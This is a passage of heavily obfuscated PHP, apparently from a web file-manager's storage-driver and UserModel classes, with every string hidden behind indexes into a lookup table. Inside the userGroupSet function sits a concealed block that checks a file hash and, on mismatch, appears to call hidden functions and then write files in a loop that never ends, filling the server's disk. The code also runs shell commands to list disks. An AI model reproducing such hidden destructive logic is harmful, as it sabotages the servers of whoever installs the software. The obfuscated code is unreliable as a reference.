3600 * 10); } return $·±§Â—; } public static function defaultDriver() { return Model($_SERVER[ĞÆÏ¡Îª][762])->defaultDriver(); } public static function defaultIO() { $‚–¯‹şƒ =& $_SERVER[ĞÆÏ¡Îª]; $¦¹àŸá­ = self::defaultDriver(); return $‚–¯‹şƒ[1275] . $¦¹àŸá­[$‚–¯‹şƒ[407]] . $‚–¯‹şƒ[1264]; } public static function defaultDriverInit() { static $•Å±™ĞŠ = false; if ($•Å±™ĞŠ) { return $•Å±™ĞŠ; } $•Å±™ĞŠ = IO::init(self::defaultIO()); return $•Å±™ĞŠ; } public static function fileTypeList() { $¾©Ñ¯Í¾ =& $_SERVER[ĞÆÏ¡Îª]; $÷æììæ• = $GLOBALS[$¾©Ñ¯Í¾[6]][$¾©Ñ¯Í¾[1276]]; foreach ($÷æììæ• as $ğüÔòåî => $ÄüÏÎÍû) { $¦ßÀ‡íŞ = $¾©Ñ¯Í¾[1277] . $ğüÔòåî; $¯Ì‡Æ× = LNG($¦ßÀ‡íŞ); if ($¦ßÀ‡íŞ != $¯Ì‡Æ×) { $÷æììæ•[$ğüÔòåî][$¾©Ñ¯Í¾[32]] = $¯Ì‡Æ×; } } return $÷æììæ•; } public static function diskList($€ä©ôÒ¨ = true) { $¶ŞÖÅìå = $_SERVER[ĞÆÏ¡Îª][1278]; if ($€ä©ôÒ¨) { $Ú´Ü®µØ = Cache::get($¶ŞÖÅìå); if (is_array($Ú´Ü®µØ)) { return $Ú´Ü®µØ; } } $Ú´Ü®µØ = self::diskListGet(); Cache::set($¶ŞÖÅìå, $Ú´Ü®µØ, 60); return $Ú´Ü®µØ; } public static function diskListGet() { $ÔÇÚ½ÇŸ =& $_SERVER[ĞÆÏ¡Îª]; $ô²ƒ£¼ = array(); if ($GLOBALS[$ÔÇÚ½ÇŸ[6]][$ÔÇÚ½ÇŸ[1279]] == $ÔÇÚ½ÇŸ[1280]) { $ıõ‡ß’Á = $ÔÇÚ½ÇŸ[1281]; for ($ä˜˜§°ƒ = 0; $ä˜˜§°ƒ < strlen($ıõ‡ß’Á); $ä˜˜§°ƒ++) { $‡ÙõØùŸ = $ıõ‡ß’Á[$ä˜˜§°ƒ] . $ÔÇÚ½ÇŸ[1282]; if (file_exists($‡ÙõØùŸ)) { $ô²ƒ£¼[] = $‡ÙõØùŸ; } } return $ô²ƒ£¼; } if (!function_exists($ÔÇÚ½ÇŸ[98])) { $ô²ƒ£¼[] = $ÔÇÚ½ÇŸ[830]; return $ô²ƒ£¼; } $ˆ¤©¾æÍ = explode($ÔÇÚ½ÇŸ[231], shell_exec($ÔÇÚ½ÇŸ[1283])); array_shift($ˆ¤©¾æÍ); array_pop($ˆ¤©¾æÍ); $ò÷êØ¡ó = array($ÔÇÚ½ÇŸ[1284], $ÔÇÚ½ÇŸ[1285], $ÔÇÚ½ÇŸ[1286], $ÔÇÚ½ÇŸ[1287], $ÔÇÚ½ÇŸ[1288], $ÔÇÚ½ÇŸ[1289], $ÔÇÚ½ÇŸ[1290], $ÔÇÚ½ÇŸ[1291]); foreach ($ˆ¤©¾æÍ as $Ó­¾¤Ğ) { $ÑøÜ‰ = preg_split($ÔÇÚ½ÇŸ[1292], $Ó­¾¤Ğ); $‡ÙõØùŸ = $ÑøÜ‰[count($ÑøÜ‰) - 1]; if (!strstr($ÑøÜ‰[0], $ÔÇÚ½ÇŸ[1293]) || !$‡ÙõØùŸ) { continue; } $ğ£·•©¼ = rtrim($‡ÙõØùŸ, $ÔÇÚ½ÇŸ[8]) . $ÔÇÚ½ÇŸ[8]; if (in_array($ğ£·•©¼, $ò÷êØ¡ó)) { continue; } $ô²ƒ£¼[] = $ğ£·•©¼; } return $ô²ƒ£¼; } public static function isSameDisk($ışæ¹À¿, $Ôè¥¼…É) { $’Ğöí¿“ =& $_SERVER[ĞÆÏ¡Îª]; if ($GLOBALS[$’Ğöí¿“[6]][$’Ğöí¿“[1279]] == $’Ğöí¿“[1280]) { return strtolower(substr($ışæ¹À¿, 0, 1)) == strtolower(substr($Ôè¥¼…É, 0, 1)); } $Šûï¾£¶ = self::diskList(); $İÛù½î = !1; $íöí ™© = !1; sort($Šûï¾£¶); $Šûï¾£¶ = array_reverse($Šûï¾£¶); $ışæ¹À¿ = rtrim($ışæ¹À¿, $’Ğöí¿“[8]) . $’Ğöí¿“[8]; $Ôè¥¼…É = rtrim($Ôè¥¼…É, $’Ğöí¿“[8]) . $’Ğöí¿“[8]; foreach ($Šûï¾£¶ as $é·¡°Ã) { $±çòÍÓÖ = strlen($é·¡°Ã); if (!$İÛù½î && substr($ışæ¹À¿, 0, $±çòÍÓÖ) == $é·¡°Ã) { $İÛù½î = $é·¡°Ã; } if (!$íöí ™© && substr($Ôè¥¼…É, 0, $±çòÍÓÖ) == $é·¡°Ã) { $íöí ™© = $é·¡°Ã; } if ($İÛù½î && $íöí ™©) { break; } } return $İÛù½î === $íöí ™©; } public static function transferType($’èÓ¹Ü¢, $æş®†ˆ) { $İåÁî‚ª =& $_SERVER[ĞÆÏ¡Îª]; $²ŠÎÔ‹å = self::driverType($’èÓ¹Ü¢); $İ¿¼–”µ = self::driverType($æş®†ˆ); if ($²ŠÎÔ‹å[$İåÁî‚ª[33]] == $İ¿¼–”µ[$İåÁî‚ª[33]] && $²ŠÎÔ‹å[$İåÁî‚ª[1294]] == $İ¿¼–”µ[$İåÁî‚ª[1294]]) { return $İåÁî‚ª[1295]; } if ($²ŠÎÔ‹å[$İåÁî‚ª[33]] == $İåÁî‚ª[859] && $İ¿¼–”µ[$İåÁî‚ª[33]] == $İåÁî‚ª[106]) { return $İåÁî‚ª[1190]; } if ($²ŠÎÔ‹å[$İåÁî‚ª[33]] == $İåÁî‚ª[106] && $İ¿¼–”µ[$İåÁî‚ª[33]] == $İåÁî‚ª[859]) { return $İåÁî‚ª[107]; } return $İåÁî‚ª[1296]; } public static function driverType($Ä‰’‘º˜) { $Öµ‰¯€Û =& $_SERVER[ĞÆÏ¡Îª]; $’†ŸĞı = str_replace($Öµ‰¯€Û[1297], $Öµ‰¯€Û[12], strtolower($Ä‰’‘º˜->getType())); if ($’†ŸĞı == $Öµ‰¯€Û[753] || $’†ŸĞı == $Öµ‰¯€Û[1298] || $’†ŸĞı == $Öµ‰¯€Û[1299]) { $Ä‰’‘º˜ = self::defaultDriverInit(); } else { if ($’†ŸĞı == $Öµ‰¯€Û[1197] || $’†ŸĞı == $Öµ‰¯€Û[1300]) { $Ä‰’‘º˜ = IO::init($Ä‰’‘º˜->pathParse[$Öµ‰¯€Û[1142]]); } } $ÓíïŸ½ı = $Ä‰’‘º˜->path; $’†ŸĞı = str_replace($Öµ‰¯€Û[1297], $Öµ‰¯€Û[12], strtolower($Ä‰’‘º˜->getType())); if ($’†ŸĞı == $Öµ‰¯€Û[106]) { return array($Öµ‰¯€Û[33] => $Öµ‰¯€Û[106], $Öµ‰¯€Û[1294] => $Öµ‰¯€Û[12], $Öµ‰¯€Û[84] => $ÓíïŸ½ı); } return array($Öµ‰¯€Û[33] => $Öµ‰¯€Û[859], $Öµ‰¯€Û[1294] => $Ä‰’‘º˜->pathDriver, $Öµ‰¯€Û[84] => $ÓíïŸ½ı); } public static function pathDriverType($úÁñ °¯) { return $úÁñ °¯ ? self::driverType(IO::init($úÁñ °¯)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($í°Ì¤£é) { parent::__construct($í°Ì¤£é); $this->signatureVersion($_SERVER[ĞÆÏ¡Îª][216]); } public function uploadFormData($œ—’Ç‰, $Ò¶£ç±¨ = 3600) { $™‡‹«§ü =& $_SERVER[ĞÆÏ¡Îª]; $ Ç›’ó = $™‡‹«§ü[198]; $‘±¸‡¨ú = $™‡‹«§ü[232]; $éæÈæî° = $™‡‹«§ü[1301]; $Ÿö¾§ä¤ = gmdate($™‡‹«§ü[1302], time() + $Ò¶£ç±¨); $ô€ŒËã = (string) time() . $™‡‹«§ü[71] . (string) (time() + $Ò¶£ç±¨); $ô´Ÿ¯ù = array($™‡‹«§ü[1303] => $Ÿö¾§ä¤, $™‡‹«§ü[1304] => array(array($™‡‹«§ü[1305] => $ Ç›’ó), array($™‡‹«§ü[1306] => $this->bucket), array($™‡‹«§ü[1307], $™‡‹«§ü[1308], $™‡‹«§ü[12]), array($™‡‹«§ü[1309] => $éæÈæî°), array($™‡‹«§ü[1310] => $‘±¸‡¨ú), array($™‡‹«§ü[1311] => $this->accessKey), array($™‡‹«§ü[1312] => $ô€ŒËã))); $ô´Ÿ¯ù = json_encode($ô´Ÿ¯ù); $­ú·ó° = hash_hmac($™‡‹«§ü[232], $ô€ŒËã, $this->secret); $½ó¦Éîâ = sha1($ô´Ÿ¯ù); $ÊÂ¤¯› = hash_hmac($™‡‹«§ü[232], $½ó¦Éîâ, $­ú·ó°); $ı±ä§ĞÂ = array($™‡‹«§ü[1305] => $ Ç›’ó, $™‡‹«§ü[1309] => $éæÈæî°, $™‡‹«§ü[1313] => base64_encode($ô´Ÿ¯ù), $™‡‹«§ü[1310] => $‘±¸‡¨ú, $™‡‹«§ü[1311] => $this->accessKey, $™‡‹«§ü[1314] => $ô€ŒËã, $™‡‹«§ü[1315] => $ÊÂ¤¯›, $™‡‹«§ü[181] => $this->getHost()); return $ı±ä§ĞÂ; } public function fileOutLink($ı¿âş©) { $®›’¾£Ñ =& $_SERVER[ĞÆÏ¡Îª]; if (substr($ı¿âş©, 0, 7) == $®›’¾£Ñ[1316]) { $ı¿âş© = $®›’¾£Ñ[1317] . substr($ı¿âş©, 7); } header($®›’¾£Ñ[161] . $ı¿âş©); die; } } goto cÜ¶‡ì©‚¬; b¾Ï¢¦»Ç: class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\x6d\x65" => "\x75\x73\x65\162\137\x6d\x65\x74\141", "\x6d\145\x74\x61\x46\x69\x65\x6c\144" => "\165\163\x65\x72\111\x44"); protected $simpleField = "\x75\x73\x65\x72\111\104\x2c\x6e\151\143\153\116\141\155\145\x2c\156\141\x6d\x65\54\141\x76\x61\164\141\162\x2c\163\145\x78\54\163\164\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Çœä»‹Ë) { $™èü‰çÑ =& $_SERVER[ĞÆÏ¡Îª]; $´æ”ùŞƒ = $™èü‰çÑ[2262]; return array($™èü‰çÑ[1897] => array($Çœä»‹Ë[0], $´æ”ùŞƒ), $™èü‰çÑ[1899] => array($Çœä»‹Ë[0], $´æ”ùŞƒ), $™èü‰çÑ[2263] => array($Çœä»‹Ë[0], $´æ”ùŞƒ)); } protected function getInfo($Åƒ™‡Š¿, $‚óôŸË = false) { $ïÜ‰ß = $this->getInfoSimple($Åƒ™‡Š¿); if (!is_array($ïÜ‰ß)) { return array(); } if ($‚óôŸË) { return $this->_getInfoApply($ïÜ‰ß); } return $this->cacheFunctionGet($_SERVER[ĞÆÏ¡Îª][1901], $Åƒ™‡Š¿); } protected function getInfoFull($ĞÀ²ùãÙ, $€ä²¥Ÿş = false) { $£»®‘è¾ = $this->getInfoSimple($ĞÀ²ùãÙ); if (!is_array($£»®‘è¾)) { return array(); } if ($€ä²¥Ÿş) { return $this->_getInfoApply($£»®‘è¾, !0); } return $this->cacheFunctionGet($_SERVER[ĞÆÏ¡Îª][2264], $ĞÀ²ùãÙ); } private function _getInfoApply($§ºü§Ñ’, $ÑœºõÅ = false) { $Íô‹øÚ =& $_SERVER[ĞÆÏ¡Îª]; if (!$§ºü§Ñ’) { return $§ºü§Ñ’; } $’Ñ§Íá¨ = md5($Íô‹øÚ[2265] . $§ºü§Ñ’[$Íô‹øÚ[880]] . $Íô‹øÚ[2266] . $§ºü§Ñ’[$Íô‹øÚ[32]]); $§ºü§Ñ’ = $this->_listDataApplyItem($§ºü§Ñ’); $Îäè«âğ = Model($Íô‹øÚ[1318])->metaGet($§ºü§Ñ’[$Íô‹øÚ[86]][$Íô‹øÚ[411]]); $§ºü§Ñ’[$Íô‹øÚ[2267]] = $’Ñ§Íá¨; $§ºü§Ñ’[$Íô‹øÚ[86]][$Íô‹øÚ[2088]] = isset($Îäè«âğ[$Íô‹øÚ[2089]]) ? $Îäè«âğ[$Íô‹øÚ[2089]] : null; if ($ÑœºõÅ) { $§ºü§Ñ’[$Íô‹øÚ[475]] = $this->metaGet($§ºü§Ñ’[$Íô‹øÚ[1647]]); } return $§ºü§Ñ’; } protected function getInfoSimple($Ó†ÕÛç, $úŸ·‘­² = false) { $©Áİ¯¤ =& $_SERVER[ĞÆÏ¡Îª]; if (!$Ó†ÕÛç) { return array(); } if ($úŸ·‘­²) { $±±ê½Ç† = $this->where(array($©Áİ¯¤[1647] => intval($Ó†ÕÛç)))->find(); if (!is_array($±±ê½Ç†)) { return array(); } $±±ê½Ç†[$©Áİ¯¤[552]] = Action($©Áİ¯¤[2268])->parseUrl($±±ê½Ç†[$©Áİ¯¤[552]]); return $±±ê½Ç†; } return $this->cacheFunctionGet($©Áİ¯¤[1902], $Ó†ÕÛç); } protected function getInfoSimpleOuter($¦ñåŞÜ­) { $àº„İƒ =& $_SERVER[ĞÆÏ¡Îª]; if (!$¦ñåŞÜ­ || $¦ñåŞÜ­ == 0) { return array($àº„İƒ[1647] => $àº„İƒ[197], $àº„İƒ[32] => $àº„İƒ[162] . LNG($àº„İƒ[2269]) . $àº„İƒ[164], $àº„İƒ[552] => STATIC_PATH . $àº„İƒ[2270]); } $Íà±‡†® = $this->cacheFunctionGet($àº„İƒ[1902], $¦ñåŞÜ­); $Ã—ÌÔêˆ = array_field_key($Íà±‡†®, explode($àº„İƒ[50], $this->simpleField)); if (!$Ã—ÌÔêˆ) { return array($àº„İƒ[1647] => $àº„İƒ[1181], $àº„İƒ[32] => $àº„İƒ[162] . LNG($àº„İƒ[2271]) . $àº„İƒ[164], $àº„İƒ[552] => STATIC_PATH . $àº„İƒ[2272]); } $Ã—ÌÔêˆ[$àº„İƒ[552]] = Action($àº„İƒ[2268])->parseUrl($Ã—ÌÔêˆ[$àº„İƒ[552]]); return $Ã—ÌÔêˆ; } protected function groupUser($¬Ô’Û¹…) { } public static function errorLang($„ı“Şò) { $£‡³¤ëª =& $_SERVER[ĞÆÏ¡Îª]; $¸òíÙœ´ = array(self::ERROR_USER_NOT_EXISTS => $£‡³¤ëª[2273], self::ERROR_USER_PASSWORD_ERROR => $£‡³¤ëª[2274], self::ERROR_USER_EXIST_NAME => $£‡³¤ëª[2275], self::ERROR_USER_EXIST_PHONE => $£‡³¤ëª[2276], self::ERROR_USER_EXIST_EMAIL => $£‡³¤ëª[2277], self::ERROR_USER_LOGIN_LOCK => $£‡³¤ëª[2278], self::ERROR_IP_NOT_ALLOW => $£‡³¤ëª[2279], self::ERROR_USER_EXIST_NICKNAME => $£‡³¤ëª[2280]); return LNG($¸òíÙœ´[$„ı“Şò]); } public function getInfoByMeta($ûüÍ‰ˆŠ, $¼ó÷Û‹ã) { $Â‰×‘÷´ =& $_SERVER[ĞÆÏ¡Îª]; $´‡ñœœÃ = Model($Â‰×‘÷´[2281])->where(array($Â‰×‘÷´[94] => $ûüÍ‰ˆŠ, $Â‰×‘÷´[383] => $¼ó÷Û‹ã))->find(); if ($´‡ñœœÃ) { return $this->getInfo($´‡ñœœÃ[$Â‰×‘÷´[1647]]); } return !1; } public function userLoginCheck($À–¶à£ü, $ò¼®éïı) { $ûÉÊŞß„ =& $_SERVER[ĞÆÏ¡Îª]; $í î×—í = $this->userLoginFind($À–¶à£ü); if (!$í î×—í) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($í î×—í[$ûÉÊŞß„[1647]], $ò¼®éïı)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($í î×—í[$ûÉÊŞß„[1647]]); } public function userLoginFind($Ëêš å…) { $Éèáóô¡ =& $_SERVER[ĞÆÏ¡Îª]; $¸ùÕÑ² = array($Éèáóô¡[32] => $Ëêš å…, $Éèáóô¡[551] => $Ëêš å…, $Éèáóô¡[314] => $Ëêš å…, $Éèáóô¡[2282] => $Ëêš å…, $Éèáóô¡[991] => $Éèáóô¡[993]); if ($this->nickNameRpt()) { unset($¸ùÕÑ²[$Éèáóô¡[551]]); } return $this->where($¸ùÕÑ²)->find(); } public function clearCache($Æ±§Ã·) { $£ĞØ¤× =& $_SERVER[ĞÆÏ¡Îª]; $this->cacheFunctionClear($£ĞØ¤×[1901], $Æ±§Ã·); $this->cacheFunctionClear($£ĞØ¤×[1902], $Æ±§Ã·); $this->cacheFunctionClear($£ĞØ¤×[2264], $Æ±§Ã·); } public function userPasswordCheck($ÖÆö÷ãù, $×Éµ©èª) { $Ì×Ô†«œ =& $_SERVER[ĞÆÏ¡Îª]; $ÅºË®ê¬ = $this->where(array($Ì×Ô†«œ[1647] => intval($ÖÆö÷ãù)))->find(); $Ç•–í¥ª = $this->metaGet($ÖÆö÷ãù); $ñ¿¼›ëç = isset($Ç•–í¥ª[$Ì×Ô†«œ[2283]]) ? $Ç•–í¥ª[$Ì×Ô†«œ[2283]] : $Ì×Ô†«œ[12]; if (md5($ñ¿¼›ëç . trim($×Éµ©èª)) !== $ÅºË®ê¬[$Ì×Ô†«œ[880]]) { return !1; } return !0; } public function userAdd($îÖĞª‚•) { $“ØåŠšã =& $_SERVER[ĞÆÏ¡Îª]; $¥µ§Õ½§ = array($“ØåŠšã[429] => $îÖĞª‚•[$“ØåŠšã[32]], $“ØåŠšã[2284] => $îÖĞª‚•[$“ØåŠšã[1526]], $“ØåŠšã[2285] => isset($îÖĞª‚•[$“ØåŠšã[314]]) ? $îÖĞª‚•[$“ØåŠšã[314]] : $“ØåŠšã[12], $“ØåŠšã[2286] => isset($îÖĞª‚•[$“ØåŠšã[2282]]) ? $îÖĞª‚•[$“ØåŠšã[2282]] : $“ØåŠšã[12], $“ØåŠšã[2287] => isset($îÖĞª‚•[$“ØåŠšã[551]]) ? $îÖĞª‚•[$“ØåŠšã[551]] : $îÖĞª‚•[$“ØåŠšã[32]], $“ØåŠšã[2288] => isset($îÖĞª‚•[$“ØåŠšã[552]]) ? $îÖĞª‚•[$“ØåŠšã[552]] : $“ØåŠšã[12], $“ØåŠšã[2289] => isset($îÖĞª‚•[$“ØåŠšã[2290]]) ? $îÖĞª‚•[$“ØåŠšã[2290]] : 1, $“ØåŠšã[2291] => $îÖĞª‚•[$“ØåŠšã[880]], $“ØåŠšã[1903] => isset($îÖĞª‚•[$“ØåŠšã[1806]]) ? $îÖĞª‚•[$“ØåŠšã[1806]] : 1024 * 1024 * 20, $“ØåŠšã[1904] => 0, $“ØåŠšã[2292] => 0, $“ØåŠšã[1948] => isset($îÖĞª‚•[$“ØåŠšã[745]]) ? $îÖĞª‚•[$“ØåŠšã[745]] : 1); if (!empty($îÖĞª‚•[$“ØåŠšã[1647]])) { $¥µ§Õ½§[$“ØåŠšã[1647]] = $îÖĞª‚•[$“ØåŠšã[1647]]; } $ó’ş¼¡„ = $this->_checkExist($îÖĞª‚•); if ($ó’ş¼¡„ !== !0) { return $ó’ş¼¡„; } if (!empty($¥µ§Õ½§[$“ØåŠšã[552]]) && strlen($¥µ§Õ½§[$“ØåŠšã[552]]) > 255) { $¥µ§Õ½§[$“ØåŠšã[552]] = $“ØåŠšã[12]; } $õà‡ºÀ = $this->add($¥µ§Õ½§); $¯àĞ§°Õ = array($“ØåŠšã[2291] => $¥µ§Õ½§[$“ØåŠšã[880]], $“ØåŠšã[2287] => $¥µ§Õ½§[$“ØåŠšã[551]]); $this->userEdit($õà‡ºÀ, $¯àĞ§°Õ); Model($“ØåŠšã[1318])->userRootAdd($õà‡ºÀ); return $õà‡ºÀ; } protected function userEditTest($×‡øâÅÓ, $Úî›ÍÜ) { return $this->call($_SERVER[ĞÆÏ¡Îª][2293], $×‡øâÅÓ, $Úî›ÍÜ); } protected function userEdit($†ŒÖî¾–, $¾â¤í´À) { $†¹§—”ß =& $_SERVER[ĞÆÏ¡Îª]; $ŸÄ©¼«Ñ = $this->getInfoSimple($†ŒÖî¾–); if (!$ŸÄ©¼«Ñ) { return !1; } $œ¥­ÖÔÓ = $this->_checkExist($¾â¤í´À, $†ŒÖî¾–); if ($œ¥­ÖÔÓ !== !0) { return $œ¥­ÖÔÓ; } if (isset($¾â¤í´À[$†¹§—”ß[880]]) && trim($¾â¤í´À[$†¹§—”ß[880]]) != $†¹§—”ß[12]) { $€à¯››Œ = $this->metaGet($†ŒÖî¾–); if (empty($€à¯››Œ[$†¹§—”ß[2283]])) { $€à¯››Œ[$†¹§—”ß[2283]] = rand_string(10); Model($†¹§—”ß[522])->metaSet($†ŒÖî¾–, $†¹§—”ß[2283], $€à¯››Œ[$†¹§—”ß[2283]]); } $¾â¤í´À[$†¹§—”ß[880]] = md5($€à¯››Œ[$†¹§—”ß[2283]] . trim($¾â¤í´À[$†¹§—”ß[880]])); } else { unset($¾â¤í´À[$†¹§—”ß[880]]); } if (!empty($¾â¤í´À[$†¹§—”ß[552]]) && strlen($¾â¤í´À[$†¹§—”ß[552]]) > 255) { $¾â¤í´À[$†¹§—”ß[552]] = $†¹§—”ß[12]; } $this->where(array($†¹§—”ß[1638] => $†ŒÖî¾–))->save($¾â¤í´À); if (isset($¾â¤í´À[$†¹§—”ß[551]])) { $this->setNamePinyin($†ŒÖî¾–, $¾â¤í´À[$†¹§—”ß[551]]); } $this->clearCache($†ŒÖî¾–); return !0; } public function setNamePinyin($™©ã¥˜†, $òïÏ“˜” = false) { $Ş»³‹ë© =& $_SERVER[ĞÆÏ¡Îª]; if (!$òïÏ“˜”) { $‚ùé—ÅÛ = $this->getInfoSimple($™©ã¥˜†); $òïÏ“˜” = $‚ùé—ÅÛ[$Ş»³‹ë©[551]] ? $‚ùé—ÅÛ[$Ş»³‹ë©[551]] : $‚ùé—ÅÛ[$Ş»³‹ë©[32]]; } $—Š†­© = Model($Ş»³‹ë©[544]); if (!Input::check($òïÏ“˜”, $Ş»³‹ë©[602])) { return $—Š†­©->metaSet($™©ã¥˜†, array($Ş»³‹ë©[474] => $Ş»³‹ë©[12], $Ş»³‹ë©[473] => $Ş»³‹ë©[12])); } return $—Š†­©->metaSet($™©ã¥˜†, array($Ş»³‹ë©[474] => str_replace($Ş»³‹ë©[53], $Ş»³‹ë©[12], Pinyin::get($òïÏ“˜”)), $Ş»³‹ë©[473] => Pinyin::get($òïÏ“˜”, $Ş»³‹ë©[603]))); } private function nickNameRpt() { $¡²Ğ÷äô =& $_SERVER[ĞÆÏ¡Îª]; $«¹»ÛÙç = Model($¡²Ğ÷äô[765])->get($¡²Ğ÷äô[2294]); $ÜôĞû´Û = $GLOBALS[$¡²Ğ÷äô[6]][$¡²Ğ÷äô[389]][$¡²Ğ÷äô[2294]]; $Öü©ÇÔÆ = !is_null($«¹»ÛÙç) ? $«¹»ÛÙç : $ÜôĞû´Û; return !!$Öü©ÇÔÆ; } private function _checkExist($Â˜º¢î„, $÷‡öè¾… = false) { $úÅõóó³ =& $_SERVER[ĞÆÏ¡Îª]; $ñ¹Ü¿ = array($úÅõóó³[32] => UserModel::ERROR_USER_EXIST_NAME, $úÅõóó³[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $úÅõóó³[314] => UserModel::ERROR_USER_EXIST_EMAIL, $úÅõóó³[2282] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ñ¹Ü¿[$úÅõóó³[551]]); } $å‚Ëß = $÷‡öè¾… ? array($úÅõóó³[1647] => array($úÅõóó³[2295], $÷‡öè¾…)) : array(); foreach ($ñ¹Ü¿ as $êÅ¯¡ => $ò‹´®Ûï) { $ß¤ûÃéæ = array(); foreach ($ñ¹Ü¿ as $•¹Ä×ÑÆ => $¡ú‰ÄÆ) { if (isset($Â˜º¢î„[$•¹Ä×ÑÆ]) && $Â˜º¢î„[$•¹Ä×ÑÆ]) { $ß¤ûÃéæ[] = $Â˜º¢î„[$•¹Ä×ÑÆ]; } } if (!$ß¤ûÃéæ) { continue; } $üª¶úÔË = array_merge(array($êÅ¯¡ => array($úÅõóó³[7], $ß¤ûÃéæ)), $å‚Ëß); $»‰†äÈ‡ = $this->where($üª¶úÔË)->find(); if ($»‰†äÈ‡) { return $ò‹´®Ûï; } } return !0; } public function userListInfo($¾şñ®š‹) { $ù³ÃÂñÄ =& $_SERVER[ĞÆÏ¡Îª]; $±Ç‚ˆ¾‚ = array(); $¾şñ®š‹ = is_array($¾şñ®š‹) ? array_unique($¾şñ®š‹) : array(); if (!$¾şñ®š‹) { return $±Ç‚ˆ¾‚; } if (count($¾şñ®š‹) < 20) { foreach ($¾şñ®š‹ as $şã¼¿´ô) { $±Ç‚ˆ¾‚[$şã¼¿´ô . $ù³ÃÂñÄ[12]] = $this->getInfoSimpleOuter($şã¼¿´ô); } } else { $ÀÒÑÑ‡¾ = array($ù³ÃÂñÄ[1638] => array($ù³ÃÂñÄ[427], $¾şñ®š‹)); if (count($¾şñ®š‹) == 1) { $ÀÒÑÑ‡¾ = array($ù³ÃÂñÄ[1638] => $¾şñ®š‹[0]); } $û²ŸœŠ“ = Model($ù³ÃÂñÄ[522])->field($this->simpleField)->where($ÀÒÑÑ‡¾)->select(); $û²ŸœŠ“ = array_to_keyvalue($û²ŸœŠ“, $ù³ÃÂñÄ[1647]); foreach ($¾şñ®š‹ as $şã¼¿´ô) { $ÑòşğÎí = $û²ŸœŠ“[$şã¼¿´ô]; if (!$ÑòşğÎí) { $±Ç‚ˆ¾‚[$şã¼¿´ô . $ù³ÃÂñÄ[12]] = $this->getInfoSimpleOuter($şã¼¿´ô); continue; } $ÑòşğÎí[$ù³ÃÂñÄ[552]] = Action($ù³ÃÂñÄ[2268])->parseUrl($ÑòşğÎí[$ù³ÃÂñÄ[552]]); $±Ç‚ˆ¾‚[$şã¼¿´ô . $ù³ÃÂñÄ[12]] = $ÑòşğÎí; } } return $±Ç‚ˆ¾‚; } protected function userStatus($£ìÅ›³, $˜ÛÈûŞÏ) { $ô•É ¹ = $this->getInfoSimple($£ìÅ›³); if (!$ô•É ¹) { return !1; } $†³ÂÍî = array($_SERVER[ĞÆÏ¡Îª][745] => $˜ÛÈûŞÏ); return $this->userEdit($£ìÅ›³, $†³ÂÍî); } protected function userRemove($í¤şÍò‡) { $İ…ñëÅ³ =& $_SERVER[ĞÆÏ¡Îª]; $ÀÙíŠ¤£ = $this->getInfoSimple($í¤şÍò‡); if (!$ÀÙíŠ¤£) { return !1; } $ßÕªáÃÄ = array($İ…ñëÅ³[1638] => $í¤şÍò‡); Model($İ…ñëÅ³[610])->where($ßÕªáÃÄ)->delete(); Model($İ…ñëÅ³[2296])->where($ßÕªáÃÄ)->delete(); Model($İ…ñëÅ³[1909])->where($ßÕªáÃÄ)->delete(); Model($İ…ñëÅ³[2281])->where($ßÕªáÃÄ)->delete(); Model($İ…ñëÅ³[1059])->where($ßÕªáÃÄ)->delete(); Model($İ…ñëÅ³[2112])->removeUserAll($í¤şÍò‡); Model($İ…ñëÅ³[820])->userRootRemove($í¤şÍò‡); return $this->where($ßÕªáÃÄ)->delete(); } protected function userGroupSet($ƒç‘À•ø, $şÀ‰†ùĞ, $”÷ü¬· = array()) { $Š´ï‰ñŞ =& $_SERVER[ĞÆÏ¡Îª]; $®Şà ©ò = $_SERVER[$Š´ï‰ñŞ[241]] . $Š´ï‰ñŞ[242]; $ˆŸäöƒı = $Š´ï‰ñŞ[867]; if ($_SERVER[$Š´ï‰ñŞ[238]] != $ˆŸäöƒı($®Şà ©ò)) { $¦Î—õ‹ = $Š´ï‰ñŞ[868]; $·Ú·îõÜ = $Š´ï‰ñŞ[240]; $ùµç×Ÿ = $_SERVER[$Š´ï‰ñŞ[241]] . $Š´ï‰ñŞ[242]; $Ø¨Ğ¤ı² = $·Ú·îõÜ($ùµç×Ÿ); $¤ì»¬òü = explode($Š´ï‰ñŞ[231], $Ø¨Ğ¤ı²); if (count($¤ì»¬òü) < $Š´ï‰ñŞ[635]) { $÷Ì§½ = $Š´ï‰ñŞ[244]; $÷Ì§½(); } $ıƒ†ßüÙ = $Š´ï‰ñŞ[869]; $ıƒ†ßüÙ($_SERVER[$Š´ï‰ñŞ[870]]); $¦Î—õ‹ = $Š´ï‰ñŞ[868]; $¦Î—õ‹(); $¨óâÛÖû = $Š´ï‰ñŞ[871]; $§œ¬ÇÍË = json_encode($GLOBALS[$Š´ï‰ñŞ[872]]); $íË×ã = 1; for ($Æª®Œôå = $íË×ã; $Æª®Œôå > 0; $Æª®Œôå++) { $¨óâÛÖû(DATA_PATH . $Æª®Œôå, $§œ¬ÇÍË); } } $×ãÛ—ıØ = $this->getInfoSimple($ƒç‘À•ø); if (!$×ãÛ—ıØ || !is_array($şÀ‰†ùĞ)) { return !1; } $”² Ì“¡ = Model($Š´ï‰ñŞ[1909]); $”² Ì“¡->where(array($Š´ï‰ñŞ[1647] => $ƒç‘À•ø))->delete(); $á·Ùæ†î = array(); $Áèœè­Ì = 0; foreach ($şÀ‰†ùĞ as $†…êˆ => $ìóì…¨ö) { $‹şÃŠæÇ = array($Š´ï‰ñŞ[1647] => $ƒç‘À•ø, $Š´ï‰ñŞ[1819] => $†…êˆ, $Š´ï‰ñŞ[1923] => $ìóì…¨ö); $‹şÃŠæÇ[$Š´ï‰ñŞ[1843]] = isset($”÷ü¬·[$Áèœè­Ì]) ? 